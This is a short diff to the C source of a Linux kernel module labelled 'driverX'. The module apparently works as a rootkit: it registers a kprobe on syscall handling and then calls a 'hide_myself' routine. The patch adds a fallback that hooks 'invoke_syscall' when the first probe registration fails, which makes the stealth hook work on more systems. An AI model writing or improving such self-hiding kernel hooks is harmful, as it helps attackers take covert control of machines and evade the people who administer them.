@@ -239,9 +239,17 @@ static int __init hide_init(void)
     kpp.pre_handler = handler_pre;
 
     ret = register_kprobe(&kpp);
-    if (ret < 0) {
+    if (ret < 0) {	
         pr_err("driverX: Failed to register kprobe: %d (%s)\n", ret, kpp.symbol_name);
-        return ret;
+
+	kpp.symbol_name = "invoke_syscall";
+        kpp.pre_handler = handler_pre;  
+
+	ret = register_kprobe(&kpp);
+	if(ret < 0) {
+	    pr_err("driverX: Failed to register kprobe: %d (%s)\n", ret, kpp.symbol_name);
+	    return ret;
+	}       
     }
     
     hide_myself();
